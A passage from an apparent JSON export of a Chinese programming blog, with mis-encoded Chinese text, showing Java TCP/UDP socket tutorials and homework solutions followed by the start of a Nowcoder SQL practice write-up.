bw.write(\"æœåŠ¡ç«¯ï¼šæ”¶åˆ°å›¾ç‰‡\");\n        bw.flush();//æŠŠå†…å®¹åˆ·æ–°åˆ°æ•°æ®é€šé“\n        socket.shutdownOutput();//è®¾ç½®å†™å…¥ç»“æŸæ ‡è®°\n        //6.å…³é—­å…¶ä»–èµ„æº\n        bw.close();\n        bos.close();\n        bis.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"æœåŠ¡ç«¯é€€å‡º.....\");\n    }\n}\n/**\næœåŠ¡ç«¯ç›‘å¬8888ç«¯å£....\næœåŠ¡ç«¯å¼€å§‹æ¥æ”¶å›¾ç‰‡\næœåŠ¡ç«¯æ¥æ”¶å›¾ç‰‡æˆåŠŸ\næœåŠ¡ç«¯é€€å‡º.....\n**/\n```\n\n#### å®¢æˆ·ç«¯\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class TCPFileUploadClient {\n    public static void main(String[] args) throws Exception {\n        //1.å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯8888ï¼Œå¾—åˆ°Socket å¯¹è±¡\n        Socket socket = new Socket(InetAddress.getLocalHost(), 8888);\n        //2.åˆ›å»ºè¯»å–ç£ç›˜æ–‡ä»¶çš„è¾“å…¥æµ\n        System.out.println(\"å®¢æˆ·ç«¯å¼€å§‹å‘é€å›¾ç‰‡\");\n        String filePath = \"/Users/jianjian/Downloads/a.jpeg\";\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(filePath));\n        //bytes å°±æ˜¯filePath å¯¹åº”çš„å­—èŠ‚æ•°ç»„\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n        //3.é€šè¿‡socket è·å–åˆ°è¾“å‡ºæµ, å°†bytes æ•°æ®å‘é€ç»™æœåŠ¡ç«¯\n        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n        bos.write(bytes);\n        bos.flush();\n        socket.shutdownOutput();//è®¾ç½®å†™å…¥æ•°æ®çš„ç»“æŸæ ‡è®°\n        System.out.println(\"å®¢æˆ·ç«¯å‘é€å›¾ç‰‡æˆåŠŸ\");\n        //4.æ¥æ”¶ä»æœåŠ¡ç«¯å›å¤çš„æ¶ˆæ¯\n        InputStream inputStream = socket.getInputStream();\n        //ä½¿ç”¨StreamUtils çš„æ–¹æ³•ï¼Œç›´æ¥å°†inputStream è¯»å–åˆ°çš„å†…å®¹è½¬æˆå­—ç¬¦ä¸²\n        String s = StreamUtils.streamToString(inputStream);\n        System.out.println(s);\n        //5.å…³é—­ç›¸å…³çš„æµ\n        inputStream.close();\n        bos.close();\n      \tbis.close();\n        socket.close();\n        System.out.println(\"å®¢æˆ·ç«¯é€€å‡º.....\");\n    }\n}\n/**\nå®¢æˆ·ç«¯å¼€å§‹å‘é€å›¾ç‰‡\nå®¢æˆ·ç«¯å‘é€å›¾ç‰‡æˆåŠŸ\næœåŠ¡ç«¯ï¼šæ”¶åˆ°å›¾ç‰‡\n\nå®¢æˆ·ç«¯é€€å‡º.....\n**/\n```\n\n##  UDPç¼–ç¨‹\n\n### ç®€ä»‹\n\n1. ç±» DatagramSocket å’Œ DatagramPacket [æ•°æ®åŒ…/æ•°æ®æŠ¥]å®ç°äº†åŸºäº UDP åè®®ç½‘ç»œç¨‹åºã€‚\n2. UDP æ•°æ®æŠ¥é€šè¿‡æ•°æ®æŠ¥å¥—æ¥å­— DatagramSocket å‘é€å’Œæ¥æ”¶ï¼Œç³»ç»Ÿä¸ä¿è¯ UDP æ•°æ®æŠ¥ä¸€å®šèƒ½å¤Ÿå®‰å…¨é€åˆ°ç›®çš„åœ°ï¼Œä¹Ÿä¸èƒ½ç¡®å®šä»€ä¹ˆæ—¶å€™å¯ä»¥æŠµè¾¾ã€‚\n3. DatagramPacket å¯¹è±¡å°è£…äº† UDP æ•°æ®æŠ¥ï¼Œåœ¨æ•°æ®æŠ¥ä¸­åŒ…å«äº†å‘é€ç«¯çš„IPåœ°å€å’Œç«¯å£å·ä»¥åŠæ¥æ”¶ç«¯çš„IPåœ°å€å’Œç«¯å£å·ã€‚\n4. UDPåè®®ä¸­æ¯ä¸ªæ•°æ®æŠ¥éƒ½ç»™å‡ºäº†å®Œæ•´çš„åœ°å€ä¿¡æ¯ï¼Œå› æ­¤æ— é¡»å»ºç«‹å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„è¿æ¥\n\n### æµç¨‹\n\nUDPï¼Œä»¥æ•°æ®æŠ¥ä½œä¸ºæ•°æ®çš„ä¼ è¾“è½½ä½“ï¼Œåœ¨è¿›è¡Œä¼ è¾“æ—¶é¦–å…ˆè¦æŠŠä¼ è¾“çš„æ•°æ®å®šä¹‰æˆæ•°æ®æŠ¥(Datagram)ï¼Œåœ¨æ•°æ®æŠ¥ä¸­æŒ‡æ˜æ•°æ®è¦åˆ°è¾¾çš„Socket(ä¸»æœºåœ°å€å’Œç«¯å£å·)ï¼Œç„¶åå†å°†æ•°æ®ä»¥æ•°æ®æŠ¥çš„å½¢å¼å‘é€å‡ºå»ï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼ŒæœåŠ¡ç«¯æ”¶ä¸æ”¶åˆ°æˆ‘å°±ä¸çŸ¥é“äº†ï¼Œé™¤éæœåŠ¡ç«¯æ”¶åˆ°ååˆç»™æˆ‘å›ä¸€æ®µç¡®è®¤çš„æ•°æ®æŠ¥ã€‚\n\n#### æ¥æ”¶ç«¯ç¼–å†™\n\n- **Step 1**ï¼šåˆ›å»ºDatagramSocketï¼ŒæŒ‡å®šç«¯å£å·\n  - DatagramSocket socket = new DatagramSocket(9999);\n\n- **Step 2**ï¼šåˆ›å»ºDatagramPacket\n  - DatagramPacket packet = new DatagramPacket(buf,buf.length);\n\n- **Step 3**ï¼šæ¥æ”¶å‘é€ç«¯å‘é€çš„æ•°æ®ä¿¡æ¯\n  - socket.receive(packet);\n\n- **Step 4**ï¼šè¯»å–æ•°æ®\n  - packet.getLength();\n  - packet.getData();\n\n- **Step 5**ï¼šå…³é—­ç›¸å…³èµ„æº\n  - socket.close();\n\n\n#### å‘é€ç«¯ç¼–å†™\n\n- **Step 1**ï¼šå®šä¹‰å‘é€ä¿¡æ¯\n  - byte[] data = \"å‘é€ç«¯ï¼šhello æ˜å¤©åƒç«é”…~\".getBytes();\n\n- **Step 2**ï¼šåˆ›å»ºDatagramPacketï¼ŒåŒ…å«å°†è¦å‘é€çš„ä¿¡æ¯\n  - DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(\"jianjian\"), 9999);\n\n- **Step 3**ï¼šåˆ›å»ºDatagramSocket\n  - DatagramSocket socket = new DatagramSocket(9998);\n\n- **Step 4**ï¼šå‘é€æ•°æ®\n  - socket.send(packet);\n\n- **Step 5**ï¼šå…³é—­ç›¸å…³èµ„æº\n  - socket.close();\n\n\n### ä¾‹å­ï¼šæ¥å—ç«¯å‘é€ç«¯é€šä¿¡\n\n- 1.ç¼–å†™ä¸€ä¸ªæ¥æ”¶ç«¯ A å’Œä¸€ä¸ªå‘é€ç«¯ B\n- 2.æ¥æ”¶ç«¯ A åœ¨ 9999 ç«¯å£ç­‰å¾…æ¥æ”¶æ•°æ®\n- 3.å‘é€ç«¯ B å‘æ¥æ”¶ç«¯ A å‘é€æ•°æ®\"hello ,æ˜å¤©åƒç«é”…~\"\n- 4.æ¥æ”¶ç«¯ A æ¥æ”¶åˆ°å‘é€ç«¯ B å‘é€çš„æ•°æ®ï¼Œå›å¤\"å¥½çš„ï¼Œæ˜å¤©è§\"ï¼Œå†é€€å‡º\n- 5.å‘é€ç«¯æ¥æ”¶å›å¤çš„æ•°æ®ï¼Œå†é€€å‡º\n\n#### æ¥å—ç«¯\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPReceiverA {\n    public static void main(String[] args) throws IOException {\n        //1. åˆ›å»ºä¸€ä¸ªDatagramSocket å¯¹è±¡ï¼Œå‡†å¤‡åœ¨9999 æ¥æ”¶æ•°æ®\n        DatagramSocket socket = new DatagramSocket(9999);\n        //2. æ„å»ºä¸€ä¸ªDatagramPacket å¯¹è±¡ï¼Œå‡†å¤‡æ¥æ”¶æ•°æ®\n        // ä¸€ä¸ªUDPæ•°æ®åŒ…æœ€å¤§64k\n        byte[] buf = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buf,buf.length);\n        System.out.println(\"æ¥æ”¶ç«¯Aç­‰å¾…æ¥æ”¶æ•°æ®..\");\n        //3. è°ƒç”¨æ¥æ”¶æ–¹æ³•, å°†é€šè¿‡ç½‘ç»œä¼ è¾“çš„DatagramPacket å¯¹è±¡,å¡«å……åˆ°packet å¯¹è±¡\n        //å½“æœ‰æ•°æ®åŒ…å‘é€åˆ°æœ¬æœºçš„9999 ç«¯å£æ—¶ï¼Œå°±ä¼šæ¥æ”¶åˆ°æ•°æ®\n        // å¦‚æœæ²¡æœ‰æ•°æ®åŒ…å‘é€åˆ°æœ¬æœºçš„9999 ç«¯å£, å°±ä¼šé˜»å¡ç­‰å¾….\n        socket.receive(packet);\n        //4. æŠŠpacketè¿›è¡Œæ‹†åŒ…ï¼Œå–å‡ºæ•°æ®ï¼Œå¹¶æ˜¾ç¤º\n        int length = packet.getLength();\n        byte[] data = packet.getData();\n        String s = new String(data, 0, length);\n        System.out.println(s);\n        //5. å›å¤ä¿¡æ¯ç»™Bç«¯,å°†éœ€è¦å‘é€çš„æ•°æ®ï¼Œå°è£…åˆ°DatagramPacket å¯¹è±¡\n        data = \"æ¥æ”¶ç«¯ï¼šå¥½çš„, æ˜å¤©è§\".getBytes();\n        //å†…å®¹å­—èŠ‚æ•°ç»„, æ•°ç»„é•¿åº¦,ä¸»æœº(IP),ç«¯å£\n        packet = new DatagramPacket(data, data.length, InetAddress.getByName(\"jianjian\"), 9998);\n        socket.send(packet);\n        //6. å…³é—­èµ„æº\n        socket.close();\n        System.out.println(\"A ç«¯é€€å‡º...\");\n    }\n}\n/**\næ¥æ”¶ç«¯Aç­‰å¾…æ¥æ”¶æ•°æ®..\nå‘é€ç«¯ï¼šhello æ˜å¤©åƒç«é”…~\nA ç«¯é€€å‡º...\n**/\n```\n\n#### å‘é€ç«¯\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.net.*;\n\npublic class UDPSenderB {\n    public static void main(String[] args) throws IOException {\n        //1.åˆ›å»ºDatagramSocket å¯¹è±¡ï¼Œå‡†å¤‡åœ¨9998 ç«¯å£æ¥æ”¶æ•°æ®\n        DatagramSocket socket = new DatagramSocket(9998);\n        //2. å°†éœ€è¦å‘é€çš„æ•°æ®ï¼Œå°è£…åˆ°DatagramPacket å¯¹è±¡\n        byte[] data = \"å‘é€ç«¯ï¼šhello æ˜å¤©åƒç«é”…~\".getBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(\"jianjian\"), 9999);\n        socket.send(packet);\n        //3. æ¥æ”¶ä»A ç«¯å›å¤çš„ä¿¡æ¯\n        //(1).æ„å»ºä¸€ä¸ªDatagramPacket å¯¹è±¡ï¼Œå‡†å¤‡æ¥æ”¶æ•°æ®\n        byte[] buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        //(2) è°ƒç”¨æ¥æ”¶æ–¹æ³•, å°†é€šè¿‡ç½‘ç»œä¼ è¾“çš„DatagramPacket å¯¹è±¡,å¡«å……åˆ°packet å¯¹è±¡\n        socket.receive(packet);\n        //(3) å¯ä»¥æŠŠpacket è¿›è¡Œæ‹†åŒ…ï¼Œå–å‡ºæ•°æ®ï¼Œå¹¶æ˜¾ç¤º.\n        int length = packet.getLength();//å®é™…æ¥æ”¶åˆ°çš„æ•°æ®å­—èŠ‚é•¿åº¦\n        data = packet.getData();//æ¥æ”¶åˆ°æ•°æ®\n        String s = new String(data, 0, length);\n        System.out.println(s);\n        //4. å…³é—­èµ„æº\n        socket.close();\n        System.out.println(\"B ç«¯é€€å‡º\");\n    }\n}\n/**\næ¥æ”¶ç«¯ï¼šå¥½çš„, æ˜å¤©è§\nB ç«¯é€€å‡º\n**/\n```\n\n## æœ¬ç« ç»ƒä¹ \n\n### 1.ç¼–ç¨‹é¢˜Homework01.java\n\n- (1)ä½¿ç”¨å­—ç¬¦æµçš„æ–¹å¼ï¼Œç¼–å†™ä¸€ä¸ªå®¢æˆ·ç«¯ç¨‹åºå’ŒæœåŠ¡å™¨ç«¯ç¨‹åº\n- (2)å®¢æˆ·ç«¯å‘é€\"name\",æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°åï¼Œè¿”å›\"æˆ‘æ˜¯novaâ€ï¼Œnova æ˜¯ä½ è‡ªå·±çš„åå­—\n- (3)å®¢æˆ·ç«¯å‘é€\"hobby\",æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°åï¼Œè¿”å›\"ç¼–å†™javaç¨‹åº\"\n- (4)ä¸æ˜¯è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œå›å¤\"ä½ è¯´å•¥å‘¢\"\n- é—®é¢˜:ç›®å‰ï¼Œæˆ‘ä»¬åªèƒ½é—®ä¸€æ¬¡ï¼Œå°±é€€å‡ºäº†ï¼Œæ€ä¹ˆå¯ä»¥é—®å¤šæ¬¡? ->while ->èŠå¤©\n\n#### æœåŠ¡ç«¯\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Homework01Server {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"æˆ‘æ˜¯æœåŠ¡ç«¯ï¼Œæ­£åœ¨ç›‘å¬9999ç«¯å£ï¼Œç­‰å¾…è¿æ¥...\");\n        Socket socket = serverSocket.accept();\n        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String s = br.readLine();\n        System.out.println(s);\n        \n        String answer = \"\";\n        if (\"name\".equals(s)) {\n            answer = \"æˆ‘æ˜¯nova\";\n        } else if(\"hobby\".equals(s)) {\n            answer = \"ç¼–å†™javaç¨‹åº\";\n        } else {\n            answer = \"ä½ è¯´å•¥å‘¢\";\n        }\n\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        bw.write(answer);\n        bw.flush();\n        socket.shutdownOutput();\n\n        bw.close();\n        br.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"æœåŠ¡ç«¯é€€å‡º.....\");\n    }\n}\n```\n\n#### å®¢æˆ·ç«¯\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class Homework01Client {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(InetAddress.getByName(\"jianjian\"),9999);\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        //ä»é”®ç›˜è¯»å–ç”¨æˆ·çš„é—®é¢˜\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¯·è¾“å…¥ä½ çš„é—®é¢˜:\");\n        String question = scanner.next();\n        bw.write(question);\n        bw.flush();\n        socket.shutdownOutput();\n\n        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String s = br.readLine();\n        System.out.println(s);\n\n        br.close();\n        bw.close();\n        socket.close();\n        System.out.println(\"å®¢æˆ·ç«¯é€€å‡º.....\");\n    }\n}\n```\n\n### 2.ç¼–ç¨‹é¢˜Homework02.java\n\n- (1)ç¼–å†™ä¸€ä¸ªæ¥æ”¶ç«¯Aå’Œä¸€ä¸ªå‘é€ç«¯B,ä½¿ç”¨UDPåè®®å®Œæˆ\n- (2)æ¥æ”¶ç«¯åœ¨8888ç«¯å£ç­‰å¾…æ¥æ”¶æ•°æ®\n- (3)å‘é€ç«¯å‘æ¥æ”¶ç«¯å‘é€æ•°æ®\"å››å¤§åè‘—æ˜¯å“ªäº›\"\n- (4)æ¥æ”¶ç«¯æ¥æ”¶åˆ°å‘é€ç«¯å‘é€çš„é—®é¢˜åï¼Œè¿”å›\"å››å¤§åè‘—æ˜¯<<çº¢æ¥¼æ¢¦>> ..â€ï¼Œå¦åˆ™è¿”å›what?\n- (5)æ¥æ”¶ç«¯å’Œå‘é€ç«¯ç¨‹åºé€€å‡º\n\n#### æ¥å—ç«¯\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class Homework02ReceiverA {\n    //- (1)ç¼–å†™ä¸€ä¸ªæ¥æ”¶ç«¯Aå’Œä¸€ä¸ªå‘é€ç«¯B,ä½¿ç”¨UDPåè®®å®Œæˆ\n    //- (2)æ¥æ”¶ç«¯åœ¨8888ç«¯å£ç­‰å¾…æ¥æ”¶æ•°æ®\n    //- (3)å‘é€ç«¯å‘æ¥æ”¶ç«¯å‘é€æ•°æ®\"å››å¤§åè‘—æ˜¯å“ªäº›\"\n    //- (4)æ¥æ”¶ç«¯æ¥æ”¶åˆ°å‘é€ç«¯å‘é€çš„é—®é¢˜åï¼Œè¿”å›\"å››å¤§åè‘—æ˜¯<<çº¢æ¥¼æ¢¦>> ..â€ï¼Œå¦åˆ™è¿”å›what?\n    //- (5)æ¥æ”¶ç«¯å’Œå‘é€ç«¯ç¨‹åºé€€å‡º\n\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buf = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buf,0,buf.length);\n        System.out.println(\"æ¥æ”¶ç«¯Aç­‰å¾…æ¥æ”¶æ•°æ®..\");\n        socket.receive(packet);\n        int length = packet.getLength();\n        byte[] data = packet.getData();\n        String s = new String(data,0,length);\n        System.out.println(s);\n\n        String anser = \"\";\n        if(\"å››å¤§åè‘—æ˜¯å“ªäº›\".equals(s)){\n            anser = \"å››å¤§åè‘—æ˜¯<<çº¢æ¥¼æ¢¦>>...\";\n        } else {\n            anser = \"What?\";\n        }\n\n        buf = anser.getBytes();\n\n\n        packet = new DatagramPacket(buf, buf.length, InetAddress.getByName(\"jianjian\"), 9999);\n        socket.send(packet);\n\n        socket.close();\n        System.out.println(\"A ç«¯é€€å‡º\");\n\n\n\n\n    }\n}\n```\n\n#### å‘é€ç«¯\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.Scanner;\n\npublic class Homework02SenderB {\n    //- (1)ç¼–å†™ä¸€ä¸ªæ¥æ”¶ç«¯Aå’Œä¸€ä¸ªå‘é€ç«¯B,ä½¿ç”¨UDPåè®®å®Œæˆ\n    //- (2)æ¥æ”¶ç«¯åœ¨8888ç«¯å£ç­‰å¾…æ¥æ”¶æ•°æ®\n    //- (3)å‘é€ç«¯å‘æ¥æ”¶ç«¯å‘é€æ•°æ®\"å››å¤§åè‘—æ˜¯å“ªäº›\"\n    //- (4)æ¥æ”¶ç«¯æ¥æ”¶åˆ°å‘é€ç«¯å‘é€çš„é—®é¢˜åï¼Œè¿”å›\"å››å¤§åè‘—æ˜¯<<çº¢æ¥¼æ¢¦>> ..â€ï¼Œå¦åˆ™è¿”å›what?\n    //- (5)æ¥æ”¶ç«¯å’Œå‘é€ç«¯ç¨‹åºé€€å‡º\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(9999);\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¯·è¾“å…¥ä½ çš„é—®é¢˜:\");\n        String question = scanner.next();\n        byte[] buf = question.getBytes();\n        DatagramPacket packet = new DatagramPacket(buf, buf.length, InetAddress.getByName(\"jianjian\"), 8888);\n        socket.send(packet);\n\n        buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        socket.receive(packet);\n\n        int length = packet.getLength();\n        byte[] data = packet.getData();\n        String s = new String(data, 0, length);\n        System.out.println(s);\n\n        socket.close();\n        System.out.println(\"B ç«¯é€€å‡º\");\n    }\n}\n```\n\n### 3.ç¼–ç¨‹é¢˜Homework03.java\n\n- (1)ç¼–å†™å®¢æˆ·ç«¯ç¨‹åºå’ŒæœåŠ¡å™¨ç«¯ç¨‹åº\n- (2)å®¢æˆ·ç«¯å¯ä»¥è¾“å…¥ä¸€ä¸ªéŸ³ä¹æ–‡ä»¶åï¼Œæ¯”å¦‚é«˜å±±æµæ°´ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°éŸ³ä¹ååï¼Œå¯ä»¥ç»™å®¢æˆ·ç«¯è¿”å›è¿™ä¸ªéŸ³ä¹æ–‡ä»¶ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªé»˜è®¤çš„éŸ³ä¹å³å¯\n- (3)å®¢æˆ·ç«¯æ”¶åˆ°æ–‡ä»¶åï¼Œä¿å­˜åˆ°æœ¬åœ° \n- (4)æç¤º:è¯¥ç¨‹åºå¯ä»¥ä½¿ç”¨StreamUtils.java\n- æœ¬è´¨:å…¶å®å°±æ˜¯æŒ‡å®šä¸‹è½½æ–‡ä»¶çš„åº”ç”¨å…ˆè‡ªå·±ç»“åˆè€å¸ˆè®²çš„æ–‡ä»¶ä¸Šä¼ æ¥åš\n\n#### æœåŠ¡ç«¯\n\n```java\npackage com.jwt.socket.homework;\n\nimport com.jwt.socket.StreamUtils;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Homework03Server {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"æœåŠ¡ç«¯ç›‘å¬9999ç«¯å£....\");\n        Socket socket = serverSocket.accept();\n        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String s = br.readLine();\n        System.out.println(s);\n        //å‘é€éŸ³ä¹\n        System.out.println(\"æœåŠ¡ç«¯å¼€å§‹å‘é€éŸ³ä¹\");\n        String music = \"\";\n        if (\"é«˜å±±æµæ°´\".equals(s)){\n            music = \"é«˜å±±æµæ°´.mp3\";\n        } else {\n            music = \"æ— å.mp3\";\n        }\n        String filePath = \"src//\" + music;\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(filePath));\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n\n        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n        bos.write(bytes);\n        bos.flush();\n        socket.shutdownOutput();//è®¾ç½®å†™å…¥æ•°æ®çš„ç»“æŸæ ‡è®°\n        System.out.println(\"å®¢æˆ·ç«¯å‘é€éŸ³ä¹æˆåŠŸ\");\n\n        bos.close();\n        bis.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"æœåŠ¡ç«¯é€€å‡º...\");\n    }\n}\n```\n\n#### å®¢æˆ·ç«¯\n\n```java\npackage com.jwt.socket.homework;\n\nimport com.jwt.socket.StreamUtils;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class Homework03Client {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(InetAddress.getLocalHost(), 9999);\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¾“å…¥éŸ³ä¹åï¼š\");\n        String downMusic = scanner.next();\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        bw.write(downMusic);\n        bw.flush();\n        socket.shutdownOutput();\n        //è¯»å–å®¢æˆ·ç«¯å‘é€çš„æ•°æ®,é€šè¿‡Socket å¾—åˆ°è¾“å…¥æµ\n        System.out.println(\"å®¢æˆ·ç«¯å¼€å§‹æ¥æ”¶éŸ³ä¹\");\n        BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n        // å°†å¾—åˆ°bytes æ•°ç»„ï¼Œå†™å…¥åˆ°æŒ‡å®šçš„è·¯å¾„ï¼Œå°±å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶äº†\n        String destFilePath = \"/Users/jianjian/Downloads/\" + downMusic + \".mp3\";\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(destFilePath));\n        bos.write(bytes);\n        bos.flush();\n        System.out.println(\"å®¢æˆ·ç«¯æ¥æ”¶éŸ³ä¹æˆåŠŸ\");\n\n        bos.close();\n        bis.close();\n        bw.close();\n        socket.close();\n        System.out.println(\"å®¢æˆ·ç«¯é€€å‡º...\");\n    }\n}\n```\n\n##  â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["ç½‘ç»œç¼–ç¨‹"],"categories":["JavaSE"]},{"title":"ç‰›å®¢-SQLç»ƒä¹ ","url":"/posts/36625.html","content":"\n## å°ç®€è®¡åˆ’\n\n- å…¥é—¨ç¯‡ï¼šã€é¢˜æ•°ï¼š39é“é¢˜ã€‘ã€éš¾åº¦ï¼šğŸŒŸğŸŒŸï½œ ç”¨æ—¶ï¼š3â˜€ï¸ã€‘    \n- å¿…ä¼šç¯‡ï¼šã€é¢˜æ•°ï¼š50é“é¢˜ã€‘ã€éš¾åº¦ï¼šğŸŒŸï½œç”¨æ—¶ï¼š3â˜€ï¸ã€‘      \n- è¿›é˜¶ç¯‡ï¼šã€é¢˜æ•°ï¼š46é“é¢˜ã€‘ã€éš¾åº¦ï¼šğŸŒŸğŸŒŸğŸŒŸï½œç”¨æ—¶ï¼š7â˜€ï¸ã€‘     \n- çœŸé¢˜ç¯‡ï¼šã€é¢˜æ•°ï¼š39é“é¢˜ã€‘ã€éš¾åº¦ï¼šğŸŒŸğŸŒŸğŸŒŸï½œç”¨æ—¶ï¼š7â˜€ï¸ã€‘\n\n## ä¸€ã€SQLå…¥é—¨ç¯‡\n\n- [x] ğŸŒŸå…¥é—¨ç¯‡ï¼š39é“é¢˜\n- [x] ğŸ•¸é¢˜ç›®åœ°å€ï¼š[ç‰›å®¢ç½‘](https://www.nowcoder.com/exam/oj?tab=SQLç¯‡&topicId=199)\n- [x] ğŸš©å°ç®€è®¡åˆ’ï¼šé¢„è®¡3å¤©å†™å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š02-28  å®Œæˆ15é“ã€03-01 å®Œæˆ13é“ã€03-02 å®Œæˆ11é“\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-02 æŒ‰æ—¶å®ŒæˆğŸ¥³\n\n### 01-åŸºç¡€æŸ¥è¯¢\n\n####  SQL1 æŸ¥è¯¢å¤šåˆ—\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥è¯¢å¤šåˆ—_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/499b6d01eae342b2aaeaf4d0da61cab0?tpId=199&tqId=1971218&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile\n```\n\n#### **SQL2** **æŸ¥è¯¢æ‰€æœ‰åˆ—**\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥è¯¢æ‰€æœ‰åˆ—_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/f9f82607cac44099a77154a80266234a?tpId=199&tqId=1971219&ru=/practice/499b6d01eae342b2aaeaf4d0da61cab0&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT * FROM user_profile\n```\n\n#### **SQL3** **æŸ¥è¯¢ç»“æœå»é‡-DISTINCT**\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥è¯¢ç»“æœå»é‡_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/82ebd89f12cf48efba0fecb392e193dd?tpId=199&tqId=1971234&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT DISTINCT university FROM user_profile\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT university FROM user_profile GROUP BY university\n```\n\n#### **SQL4** 